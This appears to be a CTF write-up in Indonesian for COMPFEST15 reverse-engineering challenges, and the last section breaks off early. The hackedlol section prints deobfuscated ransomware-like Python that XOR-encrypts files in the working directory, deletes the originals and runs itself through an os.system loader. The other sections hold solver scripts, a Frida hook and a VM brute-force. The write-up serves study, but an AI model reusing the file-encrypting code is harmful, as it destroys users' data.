# Reverse Engineering

<!-- challenge-index: 84227fa9e957cb05 -->

| Challenge | Topic |
| --- | --- |
| [hackedlol🥇](#hackedlol) | Python Bytecode, XOR |
| [KatVM🥇](#katvm) | Python Bytecode, Custom VM |
| [GoDroid 🥇](#godroid) | Go, Android, Frida |
| [Validator Machine🥇](#validator-machine) | GDB Scripting, Input Validation |

<!-- /challenge-index -->

## hackedlol

### Description

\-

### Solution

Diberikan file pyc, decompile dengan pycdc, selanjutnya tinggal deobfuscate manual

```python
import base64

print(base64.b64decode('cT1fX2ltcG9ydF9fKCdceDYyXHg2MVx4NzNceDY1XHgzNlx4MzQnLCBnbG9iYWxzKCksIGxvY2FscygpKTt6PV9faW1wb3J0X18oJ1x4NmZzJywgZ2xvYmFscygpLCBsb2NhbHMoKSk7eD1xLmI2NGRlY29kZSgiYm1ceDRhdmRIaFx4NzFaM1Z0Ym5ZOVhceDMxXHgzOVx4NzBiWEJ2Y25ceDUyZlh5Z1x4NmVYXHg0OGcyWmx4XHgzNE5ceDdhTVx4NmVMQ0JceDY2WDJKXHgzMWFXeDBhXHg1NzV6WDE4dVx4NTgxOWthV05ceDMwWDE5XHg2Mlx4NGEyZGNlRFpqYjJKXHg2OFx4NThIZ1x4MzJZM1x4NGRuWFNceDY3XHg3MExDQWdceDU4MTlpZFdceDZjc1x4NjRHbHVceDYzXHgzMTlmXHg0Y2w5Zlx4NWFceDQ3bGpceDY0Rlx4MzlmV3lceDY0XHg2M2VEWlx4NmFiMk5ceDY4WEhceDY3XHgzMlkzTVx4NmVceDU4U2dwS1x4NTR0XHg2YmIyXHg0NjNkV1x4NzBceDY5YUc1a1BWOVx4NjZhXHg1NzF3YjNceDRhMFgxOG9KMXg0Tlx4NmRaXHg3YUp5d2dYXHgzMVx4MzlpZFdsXHg3M2RHbHVjXHgzMTlceDY2TGxceDM5ZlpHbFx4NmFkRjlmV3lkXHg2ZVhIZzJZXHgzMjlceDY5WVZ4NE5ceDZkXHg0ZXpKXHgzMTBvS1N3XHg2N1x4NDlGOWZZblZwYkhScGJuTmZceDU4eVx4MzVceDY2WDJceDUycFlceDMzUmZYMVx4NzNuWEhnMlkyOWpZXHg1Nng0Tm1OekoxMG9LU1x4NmI3WW1WXHg2YWVceDQ4TjZjM0JceDZiYlx4MzJ0XHg3NVx4NjJuZGpQVzlceDc3Wlx4NTc0XHg2ZlpceDU4WmhiXHg0M2dpWEhnXHgzMVx4NWFceDZjeFx4MzRceDRlXHg1N1pjXHg2NURZMlhIZzJceDRmVnhceDM0Tm1NXHg2OVx4NGJceDc5SmNlRFx4NTkxWEhnMVx4NWFseDROV1lpS1NrdWNtVlx4NjhaQ2dceDcwQ2dwXHg2ZFx4NjIzSWdiSFpsWldceDZjcFx4NjNceDQ3MXVjM1I1YW5ceDQycExDQlx4NzdZblp0XHg2NFx4NmRceDRlNGFceDQ3XHgzNTJZbVx4MzloWlx4NTdvc1x4NDlHeGlceDVhV3QzWTNOclpIWmxaXHgzMkpceDZiXHg2NUNCcGJceDY5QnVZXHg2ZDkwZVx4NDdwXHg2ZWRXMVx4NzVkXHg2OVx4MzUzXHg1OVd4cktHNWliM1I0YW1kMWJceDU3NVx4MzJMbVx4NjRceDZjXHg2NEdOM1pceDQzXHg2N1x4NzBLVG9LSVx4NDNBZ0lHWlx4NzZceDYzaVx4NDJ2ZW5CdWJYSlx4NmRjbVx4NGV2WVx4NThONVlceDMzXHg0NVx4NjdhVzRnYkdKbGEzZGpjMlx4NzRrXHg2NG1WbllceDZkXHg1MjRPZ29nXHg0OVx4NDNBZ0lDQWdJR2xtSVx4NDc1dlx4NjRDQlx4NzZlbkJ1YlhKbVx4NjNtTnZceDU5WE41WTNceDQ1dVpXNWtjM2RceDcwZEdnb0lseDRNbVZceDYzZURjXHg3N1hceDQ4Z1x4MzNPU0lwT1x4NjdceDZmZ0lceDQzXHg0MWdJQ0FnSUNceDQxZ0lceDQzQnBceDYzXHg0N1x4NzBceDdhYzJOeVpXaDJlVzVceDZlWVhZOWIzQmxiXHg2OVx4NjhzZG1WbGFXbHdiVzV6ZFx4NDhscWNceDQ3XHg2YnJJXHg2Y3g0XHg0ZG1ZaUsyOTZjRzV0Y21aXHg3OVkyOWhjM2xqY1NceDc3Z1x4NDlceDZjeDROelx4NGFceDYzXHg2NURceDU5eUlpa3VjbVx4NTZoWkNceDY3cE9ceDMzSlx4NmVceDY1V2xzZG5kemNtUmpaRzVsZFx4NDQxdmNHVnVLR3hceDMyWldWXHg3MGFYQnRceDYyXHg2ZU5ceDMwZVx4NTdwd2FceDUzc2lYSGd5Wlx4NjlceDQ5cktHOTZjRzVceDc0Y21aeVkyXHgzOWhjM1x4NmNqY1M1eWMzQnNhWFFvSWk0aUxDQVx4NzhLVnN3WFNrXHg3MklpXHgzNWNlRFk0WEhnMk1WeDRceDRlak5jZURaaVhIZzJOVlx4Nzg0XHg0ZVx4NmFSY2VceDQ0WmpceDU4SGcyXHg1YWxceDc4NFx4NGVceDZkTWlceDRjQ1x4NDFpWEhnM04xXHg3OFx4MzRceDRlalx4NDlceDY5S1FvZ0lDQVx4NjdJXHg0M1x4NDFceDY3SUNceDQxZ1x4NDlceDQzQm1iXHgzM1x4NDlnYUc1d2NHTlx4MzNabXBceDMyY1x4MzIxXHg2YWNXXHg1Nlx4NjhJXHg0N1x4NmN1SUhKaFx4NjJtXHg2NGxLR3hsYmlceDY4XHg3MGNHcHpceDYzMk55WldoMmVceDU3XHgzNW5ZWFx4NTlwS1x4NTRvXHg0YklDXHg0MWdJQ0FceDY3XHg0OUNceDQxZ0lDQWdJQ0FnSUhKbmVXXHg2Y1x4NzNceDY0bmR6Y21ceDUyXHg2YVpHXHgzNWxkQ1x4MzUzY21sMFx4NWFceDUzaGpceDYxXHg0OElceDZmXHg2MVhCcWMzTmpjbVZvZG5sdVx4NWFceDMyRjJXMlx4NjhceDc1Y0hceDQyamQyXHg1YVx4NzFkbk5ceDc0XHg1OTNGbFlWXHgzMWViM1x4NGFrS1x4NDdceDRhbFx4NTkzaHplblx4NGV3Wkc5XHg3MmJtNTNZMXNvYUc1d2NHTlx4MzNceDVhXHg2ZHBceDMyYzIxalx4NjNceDU3VmhLakI0TWpjcEpceDU3eGxiaWhpWldOXHgzNGNceDMzcFx4N2FjXHg0N1J2YVx4MzI1dWQyTVx4NzBYU2tceDcwTG1WXHg3NVx4NTkyOWtaU1x4NjdwXHg0Ylx4NTFvXHg2N0lDXHg0MWdJQ0FnSVx4NDNBZ0lDQnVZbTkwZUdwbmRceDU3MXVkaTV5WlcxdmRtXHg1NW9iXHg0OFpceDZjWldsXHg3MGNHMXVceDYzM1I1YW5CcEtceDc5XHg0YWNlREptSWlceDc0dmVceDZlQlx4NzViWEptY21OdllceDU4TjVZM0VwQ2dwXHg2YmJceDMyRjNkV3BpXHg2MVx4NDc1XHg2YkxceDZlSmxiVzkyWlx4NTNobGRtRnNLXHg0M0pjXHg2NURceDU2XHg2ZFhIZzFabFx4Nzg0TmpaY2VEXHg1OTVYSFx4NjcyWVx4NzlJcklseDROalZjZURWXHg2ZFhIZzFaXHg2OUlwS1x4NTFceDNkXHgzZCIpO2Y9b3BlbigiXHg2OFx4NjVceDZjXHg3MFx4NjVceDcyXHgyZVx4NzBceDc5IiwgInciKTtmLndyaXRlKHguZGVjb2RlKCkpO2YuY2xvc2UoKTt6LnN5c3RlbSgiXHg3MFx4NzlceDc0XHg2OFx4NmZceDZlXHgzM1x4MjBceDY4XHg2NVx4NmNceDcwXHg2NVx4NzJceDJlXHg3MFx4NzkiKQ==').decode())


```

```python
q=__import__('base64', globals(), locals())
z=__import__('os', globals(), locals())
x=q.b64decode("bm\x4avdHh\x71Z3VtbnY9X\x31\x39\x70bXBvcn\x52fXyg\x6eX\x48g2Zlx\x34N\x7aM\x6eLCB\x66X2J\x31aWx0a\x575zX18u\x5819kaWN\x30X19\x62\x4a2dceDZjb2J\x68\x58Hg\x32Y3\x4dnXS\x67\x70LCAg\x5819idW\x6cs\x64Glu\x63\x319f\x4cl9f\x5a\x47lj\x64F\x39fWy\x64\x63eDZ\x6ab2N\x68XH\x67\x32Y3M\x6e\x58SgpK\x54t\x6bb2\x463dW\x70\x69aG5kPV9\x66a\x571wb3\x4a0X18oJ1x4N\x6dZ\x7aJywgX\x31\x39idWl\x73dGluc\x319\x66Ll\x39fZGl\x6adF9fWyd\x6eXHg2Y\x329\x69YVx4N\x6d\x4ezJ\x310oKSw\x67\x49F9fYnVpbHRpbnNf\x58y\x35\x66X2\x52pY\x33RfX1\x73nXHg2Y29jY\x56x4NmNzJ10oKS\x6b7YmV\x6ae\x48N6c3B\x6bb\x32t\x75\x62ndjPW9\x77Z\x574\x6fZ\x58Zhb\x43giXHg\x31\x5a\x6cx\x34\x4e\x57Zc\x65DY2XHg2\x4fVx\x34NmM\x69\x4b\x79JceD\x591XHg1\x5alx4NWYiKSkucmV\x68ZCg\x70Cgp\x6d\x623IgbHZlZW\x6cp\x63\x471uc3R5an\x42pLCB\x77YnZt\x64\x6d\x4e4a\x47\x352Ym\x39hZ\x57os\x49Gxi\x5aWt3Y3NrZHZlZ\x32J\x6b\x65CBpb\x69BuY\x6d90e\x47p\x6edW1\x75d\x69\x353\x59WxrKG5ib3R4amd1b\x575\x32Lm\x64\x6c\x64GN3Z\x43\x67\x70KToKI\x43AgIGZ\x76\x63i\x42venBubXJ\x6dcm\x4evY\x58N5Y\x33\x45\x67aW4gbGJla3djc2\x74k\x64mVnY\x6d\x524Ogog\x49\x43AgICAgIGlmI\x475v\x64CB\x76enBubXJm\x63mNv\x59XN5Y3\x45uZW5kc3d\x70dGgoIlx4MmV\x63eDc\x77X\x48g\x33OSIpO\x67\x6fgI\x43\x41gICAgIC\x41gI\x43Bp\x63\x47\x70\x7ac2NyZWh2eW5\x6eYXY9b3Blb\x69\x68sdmVlaWlwbW5zd\x48lqc\x47\x6brI\x6cx4\x4dmYiK296cG5tcmZ\x79Y29hc3ljcS\x77g\x49\x6cx4Nz\x4a\x63\x65D\x59yIikucm\x56hZC\x67pO\x33J\x6e\x65WlsdndzcmRjZG5ld\x441vcGVuKGx\x32ZWV\x70aXBt\x62\x6eN\x30e\x57pwa\x53siXHgyZ\x69\x49rKG96cG5\x74cmZyY2\x39hc3\x6cjcS5yc3BsaXQoIi4iLCA\x78KVswXSk\x72Ii\x35ceDY4XHg2MVx4\x4ejNceDZiXHg2NV\x784\x4e\x6aRce\x44Zj\x58Hg2\x5al\x784\x4e\x6dMi\x4cC\x41iXHg3N1\x78\x34\x4ej\x49\x69KQogICA\x67I\x43\x41\x67IC\x41g\x49\x43Bmb\x33\x49gaG5wcGN\x33Zmp\x32c\x321\x6acW\x56\x68I\x47\x6cuIHJh\x62m\x64lKGxlbi\x68\x70cGpz\x632NyZWh2e\x57\x35nYX\x59pK\x54o\x4bIC\x41gICA\x67\x49C\x41gICAgICAgIHJneW\x6c\x73\x64ndzcm\x52\x6aZG\x35ldC\x353cml0\x5a\x53hj\x61\x48I\x6f\x61XBqc3NjcmVodnlu\x5a\x32F2W2\x68\x75cH\x42jd2\x5a\x71dnN\x74\x593FlYV\x31eb3\x4akK\x47\x4al\x593hzen\x4ewZG9\x72bm53Y1soaG5wcGN\x33\x5a\x6dp\x32c21j\x63\x57VhKjB4MjcpJ\x57xlbihiZWN\x34c\x33p\x7ac\x47Rva\x325ud2M\x70XSk\x70LmV\x75\x5929kZS\x67p\x4b\x51o\x67IC\x41gICAgI\x43AgICBuYm90eGpnd\x571udi5yZW1vdm\x55ob\x48Z\x6cZWl\x70cG1u\x633R5anBpK\x79\x4aceDJmIi\x74ve\x6eB\x75bXJmcmNvY\x58N5Y3EpCgp\x6bb\x32F3dWpi\x61\x475\x6bL\x6eJlbW92Z\x53hldmFsK\x43Jc\x65D\x56\x6dXHg1Zl\x784NjZceD\x595XH\x672Y\x79IrIlx4NjVceDV\x6dXHg1Z\x69IpK\x51\x3d\x3d")
print(x.decode())
# f=open("helper.py", "w")
# f.write(x.decode())
# f.close()
# z.system("python3 helper.py")
```

```python
nbotxjgumnv=__import__('os', __builtins__.__dict__['globals'](),  __builtins__.__dict__['locals']())
doawujbhnd=__import__('os', __builtins__.__dict__['globals'](),  __builtins__.__dict__['locals']())
becxszspdoknnwc=open(eval("__file__")).read()

for lveeiipmnstyjpi, pbvmvcxhnvboaej, lbekwcskdvegbdx in nbotxjgumnv.walk(nbotxjgumnv.getcwd()):
    for ozpnmrfrcoasycq in lbekwcskdvegbdx:
        if not ozpnmrfrcoasycq.endswith(".py"):
            ipjsscrehvyngav=open(lveeiipmnstyjpi+"\x2f"+ozpnmrfrcoasycq, 'rb').read()
            rgyilvwsrdcdnet=open(lveeiipmnstyjpi+"\x2f"+(ozpnmrfrcoasycq.rsplit(".", 1)[0])+".hackedlol", 'wb')
            for hnppcwfjvsmcqea in range(len(ipjsscrehvyngav)):
                rgyilvwsrdcdnet.write(chr(ipjsscrehvyngav[hnppcwfjvsmcqea]^ord(becxszspdoknnwc[(hnppcwfjvsmcqea*0x27)%len(becxszspdoknnwc)])).encode())
            nbotxjgumnv.remove(lveeiipmnstyjpi+"\x2f"+ozpnmrfrcoasycq)

doawujbhnd.remove(eval("__file__"))
```

Algoritma enkripsi yang digunakan adalah melakukan xor dengan source code dari file enkripsi itu sendiri. Berikut solver yang kami gunakan

```python
import base64

x = base64.b64decode("bm\x4avdHh\x71Z3VtbnY9X\x31\x39\x70bXBvcn\x52fXyg\x6eX\x48g2Zlx\x34N\x7aM\x6eLCB\x66X2J\x31aWx0a\x575zX18u\x5819kaWN\x30X19\x62\x4a2dceDZjb2J\x68\x58Hg\x32Y3\x4dnXS\x67\x70LCAg\x5819idW\x6cs\x64Glu\x63\x319f\x4cl9f\x5a\x47lj\x64F\x39fWy\x64\x63eDZ\x6ab2N\x68XH\x67\x32Y3M\x6e\x58SgpK\x54t\x6bb2\x463dW\x70\x69aG5kPV9\x66a\x571wb3\x4a0X18oJ1x4N\x6dZ\x7aJywgX\x31\x39idWl\x73dGluc\x319\x66Ll\x39fZGl\x6adF9fWyd\x6eXHg2Y\x329\x69YVx4N\x6d\x4ezJ\x310oKSw\x67\x49F9fYnVpbHRpbnNf\x58y\x35\x66X2\x52pY\x33RfX1\x73nXHg2Y29jY\x56x4NmNzJ10oKS\x6b7YmV\x6ae\x48N6c3B\x6bb\x32t\x75\x62ndjPW9\x77Z\x574\x6fZ\x58Zhb\x43giXHg\x31\x5a\x6cx\x34\x4e\x57Zc\x65DY2XHg2\x4fVx\x34NmM\x69\x4b\x79JceD\x591XHg1\x5alx4NWYiKSkucmV\x68ZCg\x70Cgp\x6d\x623IgbHZlZW\x6cp\x63\x471uc3R5an\x42pLCB\x77YnZt\x64\x6d\x4e4a\x47\x352Ym\x39hZ\x57os\x49Gxi\x5aWt3Y3NrZHZlZ\x32J\x6b\x65CBpb\x69BuY\x6d90e\x47p\x6edW1\x75d\x69\x353\x59WxrKG5ib3R4amd1b\x575\x32Lm\x64\x6c\x64GN3Z\x43\x67\x70KToKI\x43AgIGZ\x76\x63i\x42venBubXJ\x6dcm\x4evY\x58N5Y\x33\x45\x67aW4gbGJla3djc2\x74k\x64mVnY\x6d\x524Ogog\x49\x43AgICAgIGlmI\x475v\x64CB\x76enBubXJm\x63mNv\x59XN5Y3\x45uZW5kc3d\x70dGgoIlx4MmV\x63eDc\x77X\x48g\x33OSIpO\x67\x6fgI\x43\x41gICAgIC\x41gI\x43Bp\x63\x47\x70\x7ac2NyZWh2eW5\x6eYXY9b3Blb\x69\x68sdmVlaWlwbW5zd\x48lqc\x47\x6brI\x6cx4\x4dmYiK296cG5tcmZ\x79Y29hc3ljcS\x77g\x49\x6cx4Nz\x4a\x63\x65D\x59yIikucm\x56hZC\x67pO\x33J\x6e\x65WlsdndzcmRjZG5ld\x441vcGVuKGx\x32ZWV\x70aXBt\x62\x6eN\x30e\x57pwa\x53siXHgyZ\x69\x49rKG96cG5\x74cmZyY2\x39hc3\x6cjcS5yc3BsaXQoIi4iLCA\x78KVswXSk\x72Ii\x35ceDY4XHg2MVx4\x4ejNceDZiXHg2NV\x784\x4e\x6aRce\x44Zj\x58Hg2\x5al\x784\x4e\x6dMi\x4cC\x41iXHg3N1\x78\x34\x4ej\x49\x69KQogICA\x67I\x43\x41\x67IC\x41g\x49\x43Bmb\x33\x49gaG5wcGN\x33Zmp\x32c\x321\x6acW\x56\x68I\x47\x6cuIHJh\x62m\x64lKGxlbi\x68\x70cGpz\x632NyZWh2e\x57\x35nYX\x59pK\x54o\x4bIC\x41gICA\x67\x49C\x41gICAgICAgIHJneW\x6c\x73\x64ndzcm\x52\x6aZG\x35ldC\x353cml0\x5a\x53hj\x61\x48I\x6f\x61XBqc3NjcmVodnlu\x5a\x32F2W2\x68\x75cH\x42jd2\x5a\x71dnN\x74\x593FlYV\x31eb3\x4akK\x47\x4al\x593hzen\x4ewZG9\x72bm53Y1soaG5wcGN\x33\x5a\x6dp\x32c21j\x63\x57VhKjB4MjcpJ\x57xlbihiZWN\x34c\x33p\x7ac\x47Rva\x325ud2M\x70XSk\x70LmV\x75\x5929kZS\x67p\x4b\x51o\x67IC\x41gICAgI\x43AgICBuYm90eGpnd\x571udi5yZW1vdm\x55ob\x48Z\x6cZWl\x70cG1u\x633R5anBpK\x79\x4aceDJmIi\x74ve\x6eB\x75bXJmcmNvY\x58N5Y3EpCgp\x6bb\x32F3dWpi\x61\x475\x6bL\x6eJlbW92Z\x53hldmFsK\x43Jc\x65D\x56\x6dXHg1Zl\x784NjZceD\x595XH\x672Y\x79IrIlx4NjVceDV\x6dXHg1Z\x69IpK\x51\x3d\x3d")
f = open("important_file.hackedlol", "rb").read()
result = b""
for i in range(len(f)):
	result += bytes([f[i] ^ x[(i*0x27)%len(x)]])
print(result)
```

<figure><img src="https://lh7-us.googleusercontent.com/jXvWje_78e8ABEp-SsSbi9ePlmWWA7Cpoz9eznmV8WKud0JszxsixmpAh-vKNhfbtsNlcAZHUY2bEQ2_tYssJluIZqo7fUCc3fKsDcFJOEin7Wz7M9jIUFAxfvhV99pIbs3a0RB4vkvlBP23qNDWQdg" alt=""><figcaption></figcaption></figure>

Flag : COMPFEST15{b1G\_brr41nz\_us1ng\_c0d3\_4s\_k3y\_8d7113ecc1}

## KatVM

### Description

\-

### Solution

Diberikan file pyc, selanjutnya lakukan decompile dengan pycdc. Karena ada beberapa kode yang invalid, maka lakukan perbaikan manual. Berikut hasil perbaikannya

katvm.py

```python
import sys
import traceback
from utils import is_eof, read_instruction, help_exit
from vm import KatVM

def run(execfile = None):
    vm = KatVM()
    f = open(execfile, 'rb')
    skip_next = False
    while True:
        (cmd, arg) = read_instruction(f)
        if skip_next:
            skip_next = False
            continue
        func = cmd
        if arg != '':
            if(func == 0):
                res = vm.left(arg)
            elif(func == 1):
                res = vm.right(arg)
            elif(func == 2):
                res = vm.store(arg)
            elif(func == 6):
                res = vm.popeq(arg)
            elif(func == 7):
                res = vm.exit(arg)
            else:
                print('arg ????')
            
            if res == True:
                skip_next = True
        else:
            if(func == 3):
                res = vm.print()
            elif(func == 4):
                res = vm.input()
            elif(func == 5):
                res = vm.push()
            elif(func == 7):
                print("end", func)
                exit()
                # res = vm.exit()
            else:
                print(func, 'none ???')
        
        if is_eof(f):
            f.close()
            return None


def main():
    if len(sys.argv) != 2:
        help_exit()
    
    try:
        run(sys.argv[1])
    finally:
        print('Segmentation fault')


main()
```

utils.py

```python
# Source Generated with Decompyle++
# File: utils.pyc (Python 3.10)

from io import BufferedReader
import os
import sys
from typing import Callable
cmds: list[tuple[(Callable, int)]] = [
    ((lambda vm: vm.left), 1),
    ((lambda vm: vm.right), 1),
    ((lambda vm: vm.store), 1),
    ((lambda vm: vm.print), 0),
    ((lambda vm: vm.input), 0),
    ((lambda vm: vm.push), 0),
    ((lambda vm: vm.popeq), 1),
    ((lambda vm: exit), 0)]

def is_eof(f = None):
    cur = f.tell()
    f.seek(0, os.SEEK_END)
    end = f.tell()
    f.seek(cur, os.SEEK_SET)
    return cur == end


def help_exit():
    print(f'''Usage: {sys.argv[0]} <kbfile>''')
    exit(1)

def read_instruction(f = None):
    bytecode = f.read(1)
    num = int.from_bytes(bytecode, 'little')
    cmd = cmds[num]
    if num == 2:
        str_len = int.from_bytes(f.read(8), 'little')
        return (num, f.read(str_len).decode())
    if cmd[1] == 0:
        return (num, '')
    return (num, f.read(8).decode().strip('\x00'))
```

vm.py

```python
class KatVM:
    tape: list[str] = ['']
    memory: list[str] = []
    pointer: int = 0
    
    def left(self = None, value = None):
        val = int(value)
        for _ in range(val):
            if self.pointer == 0:
                self.tape.insert(0, '')
                continue
            self.pointer -= 1
    
    def right(self = None, value = None):
        val = int(value)
        for _ in range(val):
            if self.pointer == len(self.tape) - 1:
                self.tape.append('')
            self.pointer += 1

    
    def store(self, string = None):
        for i in range(len(string)):
            self.tape[self.pointer] = string[i]
            self.right(1)
        self.tape[self.pointer] = ''

    
    def print(self):
        # print("tape",self.tape)
        c = self.tape[self.pointer]
        while c:
            print(c, end = '', flush=True)
            self.right(1)
            c = self.tape[self.pointer]
            if c == '':
                print('')
                break
    
    def input(self):
        self.store(input())

    
    def push(self):
        self.memory.append(self.tape[self.pointer])

    
    def popeq(self = None, value = None):
        tmp = self.memory.pop()
        return tmp == value
```

Karena hanya ada 1 fungsi pengecekan yaitu popeq dan tidak ada fungsi operasi aritmatika maka kita lakukan print saja pada popeq untuk cek nilai yang dibandingkan. Dari 2 percobaan dengan nilai yang berbeda didapatkan perbandingan untuk 2 nilai yang berbeda juga namun di index yang sama, jadi tinggal lakukan bruteforce saja.

```python
from pwn import *
import string

inp = list(string.printable[:-6])
ori = list(string.printable[:-6])
context.log_level = 'error'

for i in range(64):
	r = process(["python3", "katvm.py", "../check.kb"])
	r.recvuntil(b"secret!")
	r.sendline(''.join(inp).encode())
	r.recvline()
	for j in range(i+1):
		tmp = r.recvline().strip().decode().split(' ')	
	index = ori.index(tmp[0])
	inp[index] = tmp[1]
	r.close()
	# print(tmp)
print(''.join(inp))
```

![](https://lh7-us.googleusercontent.com/oUXdYttubN2l0E-SMFqKX6WOvqWHY8O4udn2t_iO5D3azaYcGOAyQ7qqjxLjudWiE4k1jclCpnmIoBsK9Zqs47ZUc6OOk_6zdM3MUC9WkN7lJFlu1hWnLytjsSAQnmar7k4m51pzEyBJv3U0CPo9qbI)

Sedikit perbaikan pada format flag dan dapat flag

Flag : COMPFEST15{r3Ad1ng\_byt3C0de\_c4n\_b3\_r3ally\_H4rd\_y0u\_kNow}

## GoDroid

### Description

\-

### Solution

Diberikan file apk

<figure><img src="https://lh7-us.googleusercontent.com/BD0_FTM00242tKhNr6wtkG2SpdV4PNsLF1ppaOG6q5yuRRBCXgS2TWq1997TCcAI4I1NXO1c6u0SvHH434-EgQcOOHqcWhB-ILTfM-hDDJrcs-8HvdkKxazGp6GSUmVJNdDb_kcAyypCcf-HARwy8-g" alt=""><figcaption></figcaption></figure>

Input yang kita masukkan pada aplikasi akan dibandingkan dengan string sepanjang 100 digit atau kalau diubah ke bytes sebesar 50 bytes. Dari analisis didapatkan bahwa hasil enkripsi dari input panjangnya sama dengan input. Proses enkripsi dilakukan di libgojni.so, pada fungsi utils\_Encrypt dilakukan pemanggilan fungsi utils\_F terlebih dahulu.

<figure><img src="https://lh7-us.googleusercontent.com/kNeBKqk0SDiRr1pdv8c3BtkQn4Ma2egzTbg4iyYKXmDRUvw6G44Oa2XUORyzU2J7gDIi8aQ4WpdDDmerYVH4ZoX_ONOWJZuRLQJWGeHoo7tAupjHJ7Swzw0ssD6rPuaFPWPTAlchN9E-qzvDh6vtqPE" alt=""><figcaption></figcaption></figure>

<figure><img src="https://lh7-us.googleusercontent.com/CRkmbrSjDqs-bf1rxhi-bUspohJzApYZM5x6SWrGFD1uWlpxG41DMl4jSrMftiBbnApENqUQeK_SuscXJGkHEFRzKqKrhw6xB1DGUbqwF7IjdjyhKPU_-RAMm3Dz4NTdI8Ra84PSCaR0XnOdA0STa9A" alt=""><figcaption></figcaption></figure>

Dari hasil percobaan pada golang (compile - decompile) diketahui bahwa nilai seednya adalah 0 (register x1 pada address 0xd0bc8). Selanjutnya dilakukan generate nilai random dengan randInt dan menggunakan nilai v9 sebagai argument yang mana nilai v9 terakhir adalah panjang dari input. Nilai dari v9 akan dilakukan decrement pada setiap looping.&#x20;

<figure><img src="https://lh7-us.googleusercontent.com/0H0LEtdD4x3ZcdBY5gg3V5xOYM0ikiEcXN5zhcS-BzlRyK7Lm9wUUwUrdas7YNPeGGeswj-D5zRcO2jzjIR9a6gzyE8GBkyG_ImVvWz_8Puu95_Gf8u_YpNSfGgBMLOffFVUHYPlDlYCZ-9hotSWn7c" alt=""><figcaption></figcaption></figure>

Pada saat percobaan dengan frida didapatkan perubahan satu byte pada input hanya berdampak pada satu byte pada nilai enkripsi dengan panjang yang sama. Hal tersebut menandakan bahwa terdapat pengacakan index pada input. Dengan adanya nilai yang digenerate sesuai dengan maximal index maka kami asumsikan bahwa nilai random yang digenerate akan digunakan sebagai index. Dari hasil percobaan dengan frida didapatkan bahwa asumsi tersebut benar. Selanjutnya dari hasil generate 50 nilai random terdapat nilai random yang sama dan jika digunakan sebagai index maka tidak invertible jika kita ingin mendapatkan input aslinya, dengan beberapa analisis dan percobaan didapatkan bahwa input yang telah dipetakan akan dihapus sehingga ada perubahan index nantinya

```
Input = “abcdef”
Index -> 3

Result = “d”

Input = “abcef”
Index -> 4

Result = “df”
```

v85 kemungkinan adalah nilai yang sudah dipetakan dan dixor dengan suatu nilai yang kami tidak tahu gimana memanggil fungsinya. Tapi karena sudah mengetahui flow sebagian besar, bagian xor bisa di reverse saja untuk mendapatkan nilai xornya.

<figure><img src="https://lh7-us.googleusercontent.com/y1dHLIMV-kniHjR65ZNtPVfdNgI3RtXDUeUumatnt6xxyR1RnludihumKdwuXDVrQHYFbPsegOI9Qk48q3rGyOD4cYcK6Q879eKWQAl-N9geBhpiitHxWmbWJZ6D1xxbNpX9DDUUOpsnioOPpCdNCgY" alt=""><figcaption></figcaption></figure>

Berikut solver yang kami gunakan. Dapatkan nilai untuk leak key dan pemetaan (sekaligus memastikan nilai xor static)

```javascript
//frida -U -f com.ivanox.godroid -l hook.js
Java.perform(function x() { 

    var str = 'Java.lang.String';
    var tmp = Java.use("utils.Utils");
    tmp.encrypt.implementation = function (x) {
        console.log("encrypt(" + x + ")");
        var ret_value = this.encrypt(x);
        console.log("result = " + ret_value);
        return ret_value;
    }
});
```

<figure><img src="https://lh7-us.googleusercontent.com/2gq9Ygid9x7ItO64f-9AnawDH_S9HxLpeackj7tcG_K4Q0s4q3LKxvuuKHJ54w8oGlWGy-rEt8-L48NKynm_tDelV7GKZpuZt93Vb2yMR39lZc3z_FSe7JVT6stBgxXU-OXRsbachuH5ub2jhMMp8rA" alt=""><figcaption></figcaption></figure>

Dapatkan nilai random yang merupakan index

```go
package main

import (
	"fmt"
	"math/rand"
)

func main(){
	rand.Seed(0)
	for i := 50; i > 0; i-- {
		fmt.Printf("%v, ", rand.Intn(i))
	}
}

```

Setelah memiliki data yang dibutuhkan, tinggal dapatkan static value(xor) lalu reverse pemetaan

```python
import string


ori = list(string.printable[:50])
ori_2 = ori[::-1]

mapped = ""
mapped_index = [24, 2, 25, 2, 7, 16, 31, 26, 24, 16, 8, 14, 21, 17, 24, 11, 7, 5, 2, 2, 5, 4, 18, 15, 13, 11, 16, 20, 17, 4, 17, 11, 5, 2, 6, 13, 12, 8, 5, 0, 7, 3, 4, 3, 1, 2, 0, 0, 0, 0]

for i in range(len(mapped_index)):
	mapped += ori[mapped_index[i]]
	del ori[mapped_index[i]]

xored_val = bytes.fromhex("33536753fee2705bcc7aae9e0c04bea12e96c657bbce6db43d38d43417f3b6f42120e72f3ea5e45deffc94f8e90072ce6c64")
xored_val_2 = bytes.fromhex("2c2d782b82fd5144d3658f81131b9fbe0be6b82b9eef11ab2227a44a6becceeb3e5ef8534080fb2391e38be797250ed1121a")
target = bytes.fromhex("650e2014a6d7041d8024a8984e47cc9810cead06b0c24dfc742aa71c6de29cb42679b1544286ed09cbf2d2bebd7c2ccd1148")

key = []
for i in range(len(xored_val)):
	key.append(xored_val[i] ^ ord(mapped[i]))

mapped = []
for i in range(len(xored_val)):
	mapped.append(chr(xored_val_2[i] ^ key[i]))

mapped_flag = []
for i in range(len(target)):
	mapped_flag.append(target[i] ^ key[i])

flag = [0  for i in range(len(mapped))]

for i in range(len(mapped)):
	flag[ori_2.index(mapped[i])] = mapped_flag[i]
print(''.join(map(chr,flag)))

```

<figure><img src="https://lh7-us.googleusercontent.com/tEroHNg5xsLfV9NjsWaZ2OYYADUIFswzZ7dpubHXCBIxpX6id59jIGs_Fql57EQEjxOQppcMv6QQ97DPkiEdBJy0b0CKbW_6mvnaZ3ILu9AQqx5oqLmJfIFCs4pRyb3-GHz_O_1MBr_69YteDE86OC0" alt=""><figcaption></figcaption></figure>

Flag : COMPFEST15{doot\_doola\_doot\_doo\_5bd89375a2941192b618eb4536ad6b}

## Validator Machine

### Description

\-

### Solution

Diberikan file elf 64 bit. Berikut potongan kode fungsi pertama yang dipanggil untuk mengecek input kita

<figure><img src="https://lh7-us.googleusercontent.com/d7hjZw5qa4ofmKaQ3Zk5_sINS7WkKxls_8hXp7HwHoJ-xVD3InjdBoftKU4pasUpcm8_UgFCZqFjUl8EAzdS1ZfyGkTylM02kV50G7Z-eCUgCXEFAe9NZVd-g0WfJyv9lUVZvxsTYgsTMZUiXBn7-Bg" alt=""><figcaption></figcaption></figure>

Step in pada salah satu fungsi pengecekan, contoh pada pemanggilan fungsi di address 0x023C89A.&#x20;

